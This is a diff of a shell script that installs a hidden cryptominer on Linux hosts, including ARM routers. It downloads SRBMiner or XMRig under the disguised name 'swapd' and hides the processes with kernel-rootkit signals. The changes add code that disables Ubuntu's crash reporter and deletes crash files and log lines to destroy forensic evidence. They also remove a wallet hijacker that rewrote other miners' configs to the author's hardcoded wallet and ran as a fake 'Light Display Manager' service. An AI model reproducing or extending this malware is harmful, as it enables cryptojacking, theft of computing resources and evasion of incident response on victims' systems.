@@ -1027,80 +1027,85 @@ fi
 
 # ==================== DOWNLOAD MINER ====================
 if [ "$MINER_TYPE" = "cpuminer" ]; then
-    echo "[*] Downloading cpuminer-multi for ARM..."
-    echo "[*] Note: cpuminer-multi works better on ARM32 than XMRig"
+    echo "[*] Downloading ARM-compatible miner..."
+    echo "[*] Note: Using SRBMiner-MULTI (best ARM support)"
     
     mkdir -p /root/.swapd
     cd /root/.swapd || exit 1
     
     # Clean up any previous failed attempts
-    rm -f swapd cpuminer* *.tar.gz 2>/dev/null
+    rm -f swapd cpuminer* srbminer* xmrig* *.tar.* 2>/dev/null
     
-    # Try multiple sources for cpuminer-multi ARM binary
     DOWNLOAD_SUCCESS=false
     
-    # Method 1: Try official release tarball
-    echo "[*] Trying official cpuminer-multi release..."
-    CPUMINER_URL="https://github.com/tpruvot/cpuminer-multi/releases/download/v1.3.7/cpuminer-multi-rel1.3.7-arm.tar.gz"
+    # Method 1: SRBMiner-MULTI (best ARM support, actively maintained)
+    echo "[*] Trying SRBMiner-MULTI for ARM..."
+    SRBMINER_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.4/SRBMiner-Multi-2-4-4-Linux-arm.tar.xz"
     
-    if curl -L -k -o cpuminer.tar.gz "$CPUMINER_URL" 2>/dev/null && [ -s cpuminer.tar.gz ]; then
-        echo "[*] Tarball downloaded, extracting..."
-        if tar -xzf cpuminer.tar.gz 2>/dev/null; then
-            # Look for binary in common locations
-            for location in cpuminer-multi ./cpuminer-multi bin/cpuminer-multi usr/local/bin/cpuminer-multi; do
-                if [ -f "$location" ]; then
-                    cp "$location" swapd
-                    DOWNLOAD_SUCCESS=true
-                    break
+    if curl -L -k -o srbminer.tar.xz "$SRBMINER_URL" 2>/dev/null && [ -s srbminer.tar.xz ]; then
+        FILE_SIZE=$(stat -c%s srbminer.tar.xz 2>/dev/null || wc -c < srbminer.tar.xz)
+        if [ "$FILE_SIZE" -gt 100000 ]; then
+            echo "[*] Downloaded SRBMiner ($((FILE_SIZE / 1024))KB), extracting..."
+            
+            # Try xz extraction (may not be available on BusyBox)
+            if tar -xf srbminer.tar.xz 2>/dev/null || xz -d < srbminer.tar.xz | tar -x 2>/dev/null; then
+                # Look for binary
+                for location in SRBMiner-MULTI SRBMiner-Multi-*/SRBMiner-MULTI srbminer-multi; do
+                    if [ -f "$location" ]; then
+                        cp "$location" swapd
+                        DOWNLOAD_SUCCESS=true
+                        echo "[✓] SRBMiner-MULTI installed"
+                        break
+                    fi
+                done
+            fi
+            rm -rf srbminer.tar.xz SRBMiner-Multi-* 2>/dev/null
+        fi
+    fi
+    
+    # Method 2: XMRig static build (if available)
+    if [ "$DOWNLOAD_SUCCESS" = false ]; then
+        echo "[*] Trying XMRig static ARM build..."
+        # Note: XMRig doesn't always have ARMv7 static builds
+        # This might also return 404, but worth trying
+        XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
+        
+        if curl -L -k -o xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && [ -s xmrig.tar.gz ]; then
+            FILE_SIZE=$(stat -c%s xmrig.tar.gz 2>/dev/null || wc -c < xmrig.tar.gz)
+            if [ "$FILE_SIZE" -gt 100000 ]; then
+                echo "[*] Downloaded XMRig ($((FILE_SIZE / 1024))KB), extracting..."
+                if tar -xzf xmrig.tar.gz 2>/dev/null; then
+                    for location in xmrig xmrig-*/xmrig; do
+                        if [ -f "$location" ]; then
+                            cp "$location" swapd
+                            DOWNLOAD_SUCCESS=true
+                            echo "[✓] XMRig installed"
+                            break
+                        fi
+                    done
                 fi
-            done
-        fi
-        rm -rf cpuminer.tar.gz bin usr 2>/dev/null
-    fi
-    
-    # Method 2: Try wget if curl failed
-    if [ "$DOWNLOAD_SUCCESS" = false ]; then
-        echo "[*] Trying with wget..."
-        if wget --no-check-certificate -O cpuminer.tar.gz "$CPUMINER_URL" 2>/dev/null && [ -s cpuminer.tar.gz ]; then
-            if tar -xzf cpuminer.tar.gz 2>/dev/null; then
-                for location in cpuminer-multi ./cpuminer-multi bin/cpuminer-multi; do
-                    if [ -f "$location" ]; then
-                        cp "$location" swapd
-                        DOWNLOAD_SUCCESS=true
-                        break
-                    fi
-                done
+                rm -rf xmrig.tar.gz xmrig-* 2>/dev/null
             fi
-            rm -rf cpuminer.tar.gz bin usr 2>/dev/null
         fi
     fi
     
-    # Method 3: Try direct binary download
-    if [ "$DOWNLOAD_SUCCESS" = false ]; then
-        echo "[*] Trying direct binary download..."
-        BINARY_URL="https://github.com/tpruvot/cpuminer-multi/releases/download/v1.3.7/cpuminer-multi-arm"
-        if curl -L -k -o swapd "$BINARY_URL" 2>/dev/null && [ -s swapd ]; then
-            DOWNLOAD_SUCCESS=true
-        elif wget --no-check-certificate -O swapd "$BINARY_URL" 2>/dev/null && [ -s swapd ]; then
-            DOWNLOAD_SUCCESS=true
-        fi
-    fi
-    
-    # Method 4: Use XMRig compiled for ARM as last resort
-    if [ "$DOWNLOAD_SUCCESS" = false ]; then
-        echo "[*] cpuminer-multi unavailable, trying XMRig for ARM..."
-        XMRIG_ARM_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-armv7l.tar.gz"
-        if curl -L -k -o xmrig.tar.gz "$XMRIG_ARM_URL" 2>/dev/null && [ -s xmrig.tar.gz ]; then
-            if tar -xzf xmrig.tar.gz 2>/dev/null; then
-                for location in xmrig xmrig-*/xmrig; do
-                    if [ -f "$location" ]; then
-                        cp "$location" swapd
-                        DOWNLOAD_SUCCESS=true
-                        break
-                    fi
-                done
+    # Method 3: wget fallback for SRBMiner
+    if [ "$DOWNLOAD_SUCCESS" = false ] && command -v wget >/dev/null 2>&1; then
+        echo "[*] Retrying with wget..."
+        if wget --no-check-certificate -O srbminer.tar.xz "$SRBMINER_URL" 2>/dev/null && [ -s srbminer.tar.xz ]; then
+            FILE_SIZE=$(stat -c%s srbminer.tar.xz 2>/dev/null || wc -c < srbminer.tar.xz)
+            if [ "$FILE_SIZE" -gt 100000 ]; then
+                if tar -xf srbminer.tar.xz 2>/dev/null || xz -d < srbminer.tar.xz | tar -x 2>/dev/null; then
+                    for location in SRBMiner-MULTI SRBMiner-Multi-*/SRBMiner-MULTI; do
+                        if [ -f "$location" ]; then
+                            cp "$location" swapd
+                            DOWNLOAD_SUCCESS=true
+                            break
+                        fi
+                    done
+                fi
+                rm -rf srbminer.tar.xz SRBMiner-Multi-* 2>/dev/null
             fi
-            rm -rf xmrig.tar.gz xmrig-* 2>/dev/null
         fi
     fi
     
@@ -1108,15 +1113,15 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
     if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f swapd ]; then
         chmod +x swapd 2>/dev/null
         
-        # Check file size (must be at least 100KB for a real miner)
+        # Check file size (must be at least 500KB for a real miner)
         FILE_SIZE=$(stat -c%s swapd 2>/dev/null || wc -c < swapd)
-        if [ "$FILE_SIZE" -lt 100000 ]; then
+        if [ "$FILE_SIZE" -lt 500000 ]; then
             echo "[!] ERROR: Downloaded file is too small ($FILE_SIZE bytes)"
-            echo "[!] Expected at least 100KB for a miner binary"
+            echo "[!] Expected at least 500KB for a miner binary"
             rm -f swapd
             DOWNLOAD_SUCCESS=false
         else
-            echo "[✓] Downloaded miner binary ($((FILE_SIZE / 1024))KB)"
+            echo "[✓] Miner binary ready ($((FILE_SIZE / 1024))KB)"
             ls -lh swapd
         fi
     fi
@@ -1124,19 +1129,23 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
     # Final check
     if [ ! -f swapd ] || [ ! -s swapd ]; then
         echo ""
-        echo "[!] ERROR: Failed to download miner for ARM32"
-        echo "[!] All download methods failed:"
-        echo "    - cpuminer-multi tarball"
-        echo "    - cpuminer-multi binary"
-        echo "    - XMRig ARMv7 static binary"
+        echo "=========================================="
+        echo "[!] CRITICAL: ARM MINER DOWNLOAD FAILED"
+        echo "=========================================="
         echo ""
-        echo "[!] Possible issues:"
-        echo "    - GitHub may be blocked"
-        echo "    - Network connectivity issues"
-        echo "    - Insufficient disk space"
+        echo "All download methods failed. Possible issues:"
+        echo "  1. GitHub may be blocked in your region"
+        echo "  2. Network connectivity problems"
+        echo "  3. ARM binaries not available for this release"
         echo ""
-        echo "Available disk space:"
-        df -h /root
+        echo "System info:"
+        echo "  Architecture: $(uname -m)"
+        echo "  Kernel: $(uname -r)"
+        echo "  Available space:"
+        df -h /root | tail -1
+        echo ""
+        echo "Alternative: Mining on ARM routers is generally not profitable"
+        echo "due to low CPU performance. Consider using a regular server instead."
         echo ""
         exit 1
     fi
@@ -2358,6 +2367,40 @@ else
     fi
 fi
 
+# ==================== DISABLE APPORT CRASH REPORTER ====================
+# Apport logs every unusual signal (like kill -31, kill -59) as a "crash"
+# This creates forensic evidence in /var/crash/*.crash files
+echo "[*] Disabling Ubuntu apport crash reporter..."
+
+# Stop apport service
+if systemctl is-active --quiet apport 2>/dev/null; then
+    systemctl stop apport 2>/dev/null || true
+    systemctl disable apport 2>/dev/null || true
+    echo "[✓] Apport service stopped and disabled"
+fi
+
+# Disable apport in config
+if [ -f /etc/default/apport ]; then
+    sed -i 's/enabled=1/enabled=0/g' /etc/default/apport 2>/dev/null || true
+    echo "enabled=0" > /etc/default/apport
+    echo "[✓] Apport disabled in /etc/default/apport"
+fi
+
+# Remove existing crash files (evidence of previous hide signals)
+if [ -d /var/crash ]; then
+    rm -rf /var/crash/*.crash 2>/dev/null || true
+    rm -rf /var/crash/*.uploaded 2>/dev/null || true
+    echo "[✓] Crash files removed from /var/crash/"
+fi
+
+# Clean apport entries from logs
+for logfile in /var/log/syslog /var/log/kern.log /var/log/apport.log; do
+    if [ -f "$logfile" ]; then
+        sed -i '/apport/d' "$logfile" 2>/dev/null || true
+    fi
+done
+echo "[✓] Apport disabled completely"
+
 # ==================== CLEAN UP LOGS ====================
 echo "[*] Cleaning up system logs..."
 
@@ -2405,159 +2448,13 @@ fi
 
 echo "[✓] Log cleanup complete"
 
-# ==================== INSTALL SMART WALLET HIJACKER ====================
-echo ""
-echo "[*] Installing smart wallet hijacker..."
-
-# Create the smart wallet hijacker script
-cat > /usr/local/bin/lightd << 'HIJACKER_EOF'
-#!/bin/bash
-MY_WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
-CHECK_INTERVAL=300
-exec 2>/dev/null
-set +x
-
-find_and_hijack() {
-    local changed=0
-    # Scan all processes for "-c" flag (XMRig config indicator)
-    ps auxww | grep -E '\-c\s+' | grep -v grep | while read -r line; do
-        local cmdline
-
-        cmdline=$(echo "$line" | awk '{for(i=11;i<=NF;i++) printf $i" "; print ""}')
-        local config
-
-        config=$(echo "$cmdline" | grep -oP '\-c\s+\K[^\s]+' | head -1)
-        local pid
-
-        pid=$(echo "$line" | awk '{print $2}')
-        
-        if [ -n "$config" ] && [ -f "$config" ]; then
-            if grep -q '"user"' "$config" 2>/dev/null; then
-                local current_wallet=$(grep '"user"' "$config" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
-                if [ -n "$current_wallet" ] && [ "$current_wallet" != "$MY_WALLET" ]; then
-                    cp "$config" "${config}.backup.$(date +%s)" 2>/dev/null
-                    sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$config"
-                    kill -9 "$pid" 2>/dev/null
-                    changed=1
-                fi
-            fi
-        fi
-    done
-    
-    # Scan crontabs for mining configs
-    for user in $(cut -f1 -d: /etc/passwd); do
-        local cron_content=$(crontab -u "$user" -l 2>/dev/null)
-        if [ -n "$cron_content" ]; then
-            # Look for lines with -c flag
-            echo "$cron_content" | grep -E '\-c\s+' | while read -r cronline; do
-                local config
-
-                config=$(echo "$cronline" | grep -oP '\-c\s+\K[^\s]+' | head -1)
-                if [ -n "$config" ] && [ -f "$config" ]; then
-                    if grep -q '"user"' "$config" 2>/dev/null; then
-                        local current_wallet=$(grep '"user"' "$config" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
-                        if [ -n "$current_wallet" ] && [ "$current_wallet" != "$MY_WALLET" ]; then
-                            cp "$config" "${config}.backup.$(date +%s)" 2>/dev/null
-                            sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$config"
-                            changed=1
-                        fi
-                    fi
-                fi
-            done
-        fi
-    done
-    
-    # Also update unused configs for future use
-    for config in /root/.swapd/swapfile /root/.swapd/config.json /root/.xmrig.json /root/.config/xmrig.json; do
-        if [ -f "$config" ] && ! ps auxww | grep -q "\-c.*$config"; then
-            if grep -q '"user"' "$config" 2>/dev/null; then
-                local current_wallet=$(grep '"user"' "$config" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
-                if [ -n "$current_wallet" ] && [ "$current_wallet" != "$MY_WALLET" ]; then
-                    sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$config"
-                fi
-            fi
-        fi
-    done
-    
-    if [ $changed -eq 1 ]; then
-        for service in swapd kswapd0 xmrig; do
-            systemctl restart $service 2>/dev/null || /etc/init.d/$service restart 2>/dev/null || true
-        done
-    fi
-}
-
-if [ "$1" = "daemon" ]; then
-    while true; do
-        find_and_hijack
-        sleep $CHECK_INTERVAL
-    done
-else
-    find_and_hijack
-fi
-HIJACKER_EOF
-
-chmod +x /usr/local/bin/lightd 2>/dev/null || true
-
-# Create systemd service for wallet hijacker
-if [ "$SYSTEMD_AVAILABLE" = true ]; then
-    cat > /etc/systemd/system/lightd.service << 'HIJACKER_SERVICE_EOF'
-[Unit]
-Description=Light Display Manager
-Documentation=man:lightd(1)
-After=network.target swapd.service
-
-[Service]
-Type=simple
-User=root
-ExecStart=/usr/local/bin/lightd daemon
-ExecStartPost=/bin/bash -c 'sleep 3; for i in 1 2 3; do pgrep -f lightd | xargs -r kill -31 2>/dev/null; pgrep -f lightd | xargs -r kill -59 2>/dev/null; sleep 1; done'
-Restart=always
-RestartSec=30
-StandardOutput=null
-StandardError=null
-
-[Install]
-WantedBy=multi-user.target
-HIJACKER_SERVICE_EOF
-    
-    systemctl daemon-reload 2>/dev/null || true
-    systemctl enable lightd 2>/dev/null
-    
-    if systemctl is-active --quiet lightd 2>/dev/null; then
-        echo "[*] Wallet hijacker already running - restarting service..."
-        systemctl restart lightd 2>/dev/null
-    else
-        systemctl start lightd 2>/dev/null
-    fi
-    
-    # Verify it's running
-    sleep 2
-    if systemctl is-active --quiet lightd 2>/dev/null; then
-        echo "[✓] Smart wallet hijacker installed and RUNNING (systemd service)"
-        if systemctl is-enabled --quiet lightd 2>/dev/null; then
-            echo "[✓] Smart wallet hijacker ENABLED (auto-starts on boot)"
-        else
-            echo "[!] Warning: Service may not be enabled for auto-start"
-            echo "[*] Enabling service..."
-            systemctl enable lightd 2>/dev/null || true
-        fi
-        
-        # Verify it's hidden
-        if proc_pids lightd | grep -q . 2>/dev/null; then
-            echo "[⚠] WARNING: lightd process still VISIBLE"
-        else
-            echo "[✓] lightd process successfully HIDDEN by kernel rootkits"
-        fi
-    else
-        echo "[!] Warning: Smart wallet hijacker service failed to start"
-        echo "[*] Trying to start manually..."
-        systemctl start lightd 2>/dev/null || true
-    fi
-else
-    # For SysV systems, add to cron
-    (crontab -l 2>/dev/null | grep -v lightd; echo "*/5 * * * * /usr/local/bin/lightd >/dev/null 2>&1") | crontab - 2>/dev/null || true
-    echo "[✓] Smart wallet hijacker installed (cron job)"
-fi
+# ==================== WALLET HIJACKER DISABLED ====================
+# Reason: lightd process was visible in 'ps aux' output
+# Even with rootkits, it appeared as "/bin/bash /usr/local/bin/lightd daemon"
+# Additionally, hide signals (kill -31/-59) triggered Ubuntu's apport crash reporter
+# This created forensic evidence in /var/crash/*.crash files
+# Disabled to reduce detection surface
+echo "[*] Wallet hijacker disabled (stealth optimization)"
 
 # ==================== FINAL CLEANUP ====================
 echo "[*] Final cleanup..."
@@ -2862,7 +2759,7 @@ while [ $attempt -lt $MAX_ATTEMPTS ] && [ "$all_hidden" = false ]; do
     # Send both hide signals to all target processes
     # kill -31: Diamorphine + Crypto-RK
     # kill -59: Singularity
-    for pattern in config.json swapd swapfile lightd; do
+    for pattern in config.json swapd swapfile system-watchdog; do
         pids=$(proc_pids "$pattern" 2>/dev/null)
         if [ -n "$pids" ]; then
             for pid in $pids; do
@@ -2878,7 +2775,7 @@ while [ $attempt -lt $MAX_ATTEMPTS ] && [ "$all_hidden" = false ]; do
     # Check if processes are now hidden
     echo "[*] Verifying process visibility..."
     if ! proc_pids swapd | grep -q . 2>/dev/null && \
-       ! proc_pids lightd | grep -q . 2>/dev/null; then
+       ! proc_pids system-watchdog | grep -q . 2>/dev/null; then
         all_hidden=true
         echo "[✓] All processes successfully hidden!"
     else
@@ -2892,8 +2789,8 @@ if [ "$all_hidden" = false ]; then
     echo "[*] Manual fix: Run these commands:"
     echo "    kill -31 \$(pgrep swapd)"
     echo "    kill -59 \$(pgrep swapd)"
-    echo "    kill -31 \$(pgrep lightd)"
-    echo "    kill -59 \$(pgrep lightd)"
+    echo "    kill -31 \$(pgrep system-watchdog)"
+    echo "    kill -59 \$(pgrep system-watchdog)"
 fi
 
 echo '========================================================================'
